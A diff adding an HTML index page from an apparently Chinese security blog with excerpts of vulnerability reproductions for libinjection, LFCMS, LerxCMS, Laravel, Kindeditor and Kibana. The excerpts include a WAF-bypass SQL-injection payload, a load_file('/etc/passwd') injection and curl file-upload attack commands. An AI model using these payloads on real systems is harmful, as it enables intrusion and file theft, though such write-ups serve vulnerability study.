@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/64/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Libinjection/Libinjection 语义分析通用绕过" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Libinjection/Libinjection%20%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.012Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Libinjection-语义分析通用绕过"><a href="#Libinjection-语义分析通用绕过" class="headerlink" title="Libinjection 语义分析通用绕过"></a>Libinjection 语义分析通用绕过</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>源码下载地址 <code>https://github.com/client9/libinjection</code></p>
+<blockquote>
+<p>example.c</p>
+</blockquote>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;strings.h&gt;
+#include &lt;errno.h&gt;
+#include &quot;libinjection.h&quot;
+#include &quot;libinjection_sqli.h&quot;
+
+int main(int argc, const char* argv[])
+&#123;
+    struct libinjection_sqli_state state;
+    int issqli;
+
+    const char* input = argv[1];
+    size_t slen = strlen(input);
+
+    /* in real-world, you would url-decode the input, etc */
+
+    libinjection_sqli_init(&amp;state, input, slen, FLAG_NONE);
+    issqli = libinjection_is_sqli(&amp;state);
+    if (issqli) &#123;
+        fprintf(stderr, &quot;sqli detected with fingerprint of &#39;%s&#39;\n&quot;, state.fingerprint);
+    &#125;
+    return issqli;
+&#125;
+$ gcc -Wall -Wextra examples.c libinjection_sqli.c
+$ ./a.out &quot;-1&#39; and 1=1 union/* foo */select load_file(&#39;/etc/passwd&#39;)--&quot;
+sqli detected with fingerprint of &#39;s&amp;1UE&#39;
+</code></pre>
+<p><strong>首先给一个pyload</strong></p>
+<pre><code># ./bin &quot;ad1n&#39;-- %a%0aunion select 1,database(),user() -- &quot; 
+not sqli 
+#
+</code></pre>
+<p>测试payload 是否OK</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Libinjection/Libinjection%20%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Libinjection/Libinjection%20%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/" data-id="cl5c2qrpm00aiy8v1grvrdpdd" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-LFCMS/LFCMS 后台任意文件读取漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/LFCMS/LFCMS%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.928Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="LFCMS-后台任意文件读取漏洞"><a href="#LFCMS-后台任意文件读取漏洞" class="headerlink" title="LFCMS 后台任意文件读取漏洞"></a>LFCMS 后台任意文件读取漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞起始点位于<code>/Application/Admin/Controller/TemplateController.class.php</code>中的<code>edit</code>方法，该方法用作后台模板编辑，关键代码如下<img src="/resource/LFCMS%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
+<p>我们传入的路径需要将<code>/</code>替换为<code>*</code>接着调用了<code>read</code>方法，跟进该方法</p>
+<pre><code>public function read($filename,$type=&#39;&#39;)&#123;
+      return $this-&gt;get($filename,&#39;content&#39;,$type);
+&#125;
+</code></pre>
+<p>继续跟进get方法</p>
+<pre><code>public function get($filename,$name,$type=&#39;&#39;) &#123;
+    if(!isset($this-&gt;contents[$filename])) &#123;
+        if(!is_file($filename)) return false;
+        $this-&gt;contents[$filename]=file_get_contents($filename);
+    &#125;
+    $content=$this-&gt;contents[$filename];
+    $info   =   array(
+                &#39;mtime&#39;     =&gt;  filemtime($filename),
+                &#39;content&#39;   =&gt;  $content
+            );
+    return $info[$name];
+&#125;
+&#125;
+</code></pre>
+<p>该方法中返回了要读取的文件内容，可以看到在整个流程中没有对传入参数<code>path</code>的过滤，导致我们可以跨目录读文件，下面来验证一下，尝试读取一下跟目录<code>index.php</code>文件，测试链接如下</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/LFCMS/LFCMS%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/LFCMS/LFCMS%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrol00ahy8v1dj5q4o7p" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-LFCMS/LFCMS 后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/LFCMS/LFCMS%20%E5%90%8E%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.926Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="LFCMS-后台getshell"><a href="#LFCMS-后台getshell" class="headerlink" title="LFCMS 后台getshell"></a>LFCMS 后台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>该漏洞可以利用的原因一是在于后台对于站点配置数据没有做好过滤，二是利用了tp3.2版本下本身存在的缓存漏洞，漏洞起始利用点位于<code>/Application/Admin/Controller/ConfigController.class.php</code>中的<code>save</code>方法，代码如下</p>
+<p><img src="/resource/LFCMS%E5%90%8E%E5%8F%B0getshell/media/rId24.png" alt="1.png"></p>
+<p>该处将后台设置的配置项直接存储在数据库中，接着当用户访问站点前台页面时，会调用<code>/Application/Home/Controller/HomeController.class.php</code>中的<code>_initialize</code>方法，部分代码如图</p>
+<p><img src="/resource/LFCMS%E5%90%8E%E5%8F%B0getshell/media/rId25.png" alt="2.png"></p>
+<p>当第一次访问时，会调用第二十一行的缓存函数写缓存文件，在这里如果在设置配置数据的时候写入恶意的<code>PHP</code>代码，就可以在缓存文件中写入我们想要执行的代码，进而<code>getshell</code>，首先我们来到后台用户配置设置处</p>
+<p><img src="/resource/LFCMS%E5%90%8E%E5%8F%B0getshell/media/rId26.png" alt="3.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/LFCMS/LFCMS%20%E5%90%8E%E5%8F%B0getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/LFCMS/LFCMS%20%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2qrol00agy8v1fi4eb6dl" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-LFCMS/LFCMS NewsController.class.php 前台sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/LFCMS/LFCMS%20NewsController.class.php%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.923Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="LFCMS-NewsController-class-php-前台sql注入漏洞"><a href="#LFCMS-NewsController-class-php-前台sql注入漏洞" class="headerlink" title="LFCMS NewsController.class.php 前台sql注入漏洞"></a>LFCMS NewsController.class.php 前台sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>回到lfcms，漏洞起始点位于<code>/Application/Home/Controller/NewsController.class.php</code>中的<code>index</code>方法，代码如下</p>
+<p><img src="/resource/LFCMSNewsController.class.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
+<p>在代码第六行调用了<code>News</code>模型中的<code>detail</code>方法，跟进该方法</p>
+<p><img src="/resource/LFCMSNewsController.class.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="2.png"></p>
+<p>可以看到在第八行进而调用了<code>tp</code>的<code>find</code>方法，在该版本中<code>find</code>方法是可以进行注入的，同时参数<code>$id</code>是我们可控的，首先我们来看一下正常的输入情况(图中域名为本地搭建解析)</p>
+<p><img src="/resource/LFCMSNewsController.class.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="3.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/LFCMS/LFCMS%20NewsController.class.php%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/LFCMS/LFCMS%20NewsController.class.php%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrok00afy8v1hu9i7lkg" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-LFCMS/LFCMS AjaxController.class.php 前台sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/LFCMS/LFCMS%20AjaxController.class.php%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.920Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="LFCMS-AjaxController-class-php-前台sql注入漏洞"><a href="#LFCMS-AjaxController-class-php-前台sql注入漏洞" class="headerlink" title="LFCMS AjaxController.class.php 前台sql注入漏洞"></a>LFCMS AjaxController.class.php 前台sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞起始点位于<code>/Application/Home/Controller/AjaxController.class.php</code>文件中的<code>randMovie</code>方法，代码如下</p>
+<p><img src="/resource/LFCMSAjaxController.class.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
+<p>第七行代码中调用了<code>Ajax</code>模型中的<code>randMovie</code>方法，同时<code>limit</code>和<code>category</code>是我们输入的可控的参数，跟进<code>randMovie</code>方法</p>
+<pre><code>public function randMovie($limit=6,$category=&#39;&#39;) &#123;
+    if($category) &#123;
+        $type=&#39;and category=&#39;.$category;
+    &#125;
+    $prefix=C(&#39;DB_PREFIX&#39;);
+    $mlist=M()-&gt;query(&#39;SELECT * FROM `&#39;.$prefix.&#39;movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `&#39;.$prefix.&#39;movie`)-(SELECT MIN(id) FROM `&#39;.$prefix.&#39;movie`))+(SELECT MIN(id) FROM `&#39;.$prefix.&#39;movie`)) AS idx) AS t2 WHERE t1.id &gt;= t2.idx &#39;.$type.&#39; ORDER BY t1.id LIMIT &#39;.$limit);
+    foreach($mlist as $key=&gt;$value) &#123;
+        $list[$key]=D(&#39;Tag&#39;)-&gt;movieChange($value,&#39;movie&#39;);
+    &#125;
+    return $list;
+&#125;
+</code></pre>
+<p>在这里注意到<code>$type</code>与<code>$limit</code>在<code>sql</code>语句执行时均没有被单引号包裹，直接拼接到语句当中，这里就存在了sql注入的可能，首先我们在<code>movie</code>表里放一条数据，看一下正常执行时sql语句是如何执行的</p>
+<p><img src="/resource/LFCMSAjaxController.class.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="2.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/LFCMS/LFCMS%20AjaxController.class.php%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/LFCMS/LFCMS%20AjaxController.class.php%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrok00aey8v150uz15qi" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-LerxCMS/LerxCMS 6.5 后台ssrf getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/LerxCMS/LerxCMS%206.5%20%E5%90%8E%E5%8F%B0ssrf%20getshell/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.863Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="LerxCMS-6-5-后台ssrf-getshell"><a href="#LerxCMS-6-5-后台ssrf-getshell" class="headerlink" title="LerxCMS 6.5 后台ssrf getshell"></a>LerxCMS 6.5 后台ssrf getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>LerxCMS 6.5<br>版本后台在加载模板时存在SSRF漏洞，通过深入利用该漏洞可以通过远程加载指定的模板文件来Getshell~</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>LerxCMS 6.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>文件位置：<code>lerx_v6.3.0\WebContent\WEB-INF\views\jsp\templet\portal\remote.jsp</code></p>
+<p>漏洞描述：下载时未对来源做检查，只要URL非空即可，故而存在SSRF：</p>
+<p><img src="/resource/LerxCMS6.5%E5%90%8E%E5%8F%B0ssrfgetshell/media/rId25.png" alt="1.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/LerxCMS/LerxCMS%206.5%20%E5%90%8E%E5%8F%B0ssrf%20getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/LerxCMS/LerxCMS%206.5%20%E5%90%8E%E5%8F%B0ssrf%20getshell/" data-id="cl5c2qroj00ady8v1hxtd37jw" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Laravel/（CVE-2019-9081）Laravel 5.7 反序列化rce" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Laravel/%EF%BC%88CVE-2019-9081%EF%BC%89Laravel%205.7%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.727Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-9081）Laravel-5-7-反序列化rce"><a href="#（CVE-2019-9081）Laravel-5-7-反序列化rce" class="headerlink" title="（CVE-2019-9081）Laravel 5.7 反序列化rce"></a>（CVE-2019-9081）Laravel 5.7 反序列化rce</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Laravel Framework<br>5.7.x版本中的Illuminate组件存在安全漏洞。远程攻击者可利用该漏洞执行代码。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Laravel 5.7</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h5 id="漏洞demo"><a href="#漏洞demo" class="headerlink" title="漏洞demo"></a>漏洞demo</h5><p>由于我没有找到laravel框架触发反序列化的点，因此我们需要自己构造一个漏洞demo，用作poc的验证。</p>
+<p>在<code>routes/web.php</code>文件中添加这样一条路由记录:<code>Route::get(&#39;/index&#39;, &#39;TaskController@index&#39;);</code></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Laravel/%EF%BC%88CVE-2019-9081%EF%BC%89Laravel%205.7%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Laravel/%EF%BC%88CVE-2019-9081%EF%BC%89Laravel%205.7%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" data-id="cl5c2qrmi00acy8v1fyd71mwf" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Laravel/（CVE-2018-15133）Laravel 反序列化远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Laravel/%EF%BC%88CVE-2018-15133%EF%BC%89Laravel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.725Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-15133）Laravel-反序列化远程命令执行漏洞"><a href="#（CVE-2018-15133）Laravel-反序列化远程命令执行漏洞" class="headerlink" title="（CVE-2018-15133）Laravel 反序列化远程命令执行漏洞"></a>（CVE-2018-15133）Laravel 反序列化远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>利用前需要知道app_key，才可以进行利用。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Laravel framework 5.5.x&lt;=5.5.40</p>
+<p>Laravel framework 5.6.x&lt;=5.6.29</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞分别可以在两个地方触发一个是直接添加在 <strong>cookie</strong> 字段，例如：<br><strong>Cookie: ATTACK=payload</strong> ；另一处是在 <strong>HTTP Header</strong> 处添加<br><strong>X-XSRF-TOKEN</strong> 字段，例如： <strong>X-XSRF-TOKEN: payload</strong> 。</p>
+<h4 id="通过Cookie触发RCE"><a href="#通过Cookie触发RCE" class="headerlink" title="通过Cookie触发RCE"></a>通过Cookie触发RCE</h4><p>通过 <strong>Cookie</strong> 触发 <strong>RCE</strong> 的 <strong>EXP</strong> 如下（这里payload中执行的命令是<br><code>curl 127.0.0.1:8888</code> ）：</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Laravel/%EF%BC%88CVE-2018-15133%EF%BC%89Laravel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Laravel/%EF%BC%88CVE-2018-15133%EF%BC%89Laravel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrmg00a9y8v13030dp1f" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Kindeditor/（CVE-2017-1002024）Kindeditor _=4.1.11 上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Kindeditor/%EF%BC%88CVE-2017-1002024%EF%BC%89Kindeditor%20_=4.1.11%20%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.708Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2017-1002024）Kindeditor-lt-4-1-11-上传漏洞"><a href="#（CVE-2017-1002024）Kindeditor-lt-4-1-11-上传漏洞" class="headerlink" title="（CVE-2017-1002024）Kindeditor &lt;=4.1.11 上传漏洞"></a>（CVE-2017-1002024）Kindeditor &lt;=4.1.11 上传漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>漏洞存在于kindeditor编辑器里，你能上传.txt和.html文件，支持php/asp/jsp/asp.net,漏洞存在于小于等于kindeditor4.1.11编辑器中</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Kindeditor &lt;=4.1.11</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -F&quot;imgFile=@a.html&quot; http://127.0.0.1/kindeditor/php/upload_json.php?dir=file</span><br><span class="line">curl -F&quot;imgFile=@a.html&quot; http://127.0.0.1/kindeditor/asp/upload_json.asp?dir=file</span><br><span class="line">curl -F&quot;imgFile=@a.html&quot; http://127.0.0.1/kindeditor/jsp/upload_json.jsp?dir=file</span><br><span class="line">curl -F&quot;imgFile=@a.html&quot; http://127.0.0.1/kindeditor/aspx/upload_json.aspx?dir=file </span><br><span class="line">​```返回值为路径 </span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>json文件地址</p>
+</blockquote>
+<pre><code>/asp/upload_json.asp
+
+/asp.net/upload_json.ashx
+
+/jsp/upload_json.jsp
+
+/php/upload_json.php
+</code></pre>
+<blockquote>
+<p>上传路径</p>
+</blockquote>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Kindeditor/%EF%BC%88CVE-2017-1002024%EF%BC%89Kindeditor%20_=4.1.11%20%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Kindeditor/%EF%BC%88CVE-2017-1002024%EF%BC%89Kindeditor%20_=4.1.11%20%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrmg00a8y8v1gue9alrw" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Kibana/（CVE-2019-7609）Kibana _ 6.6.0 未授权远程代码命令执行" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Kibana/%EF%BC%88CVE-2019-7609%EF%BC%89Kibana%20_%206.6.0%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.636Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
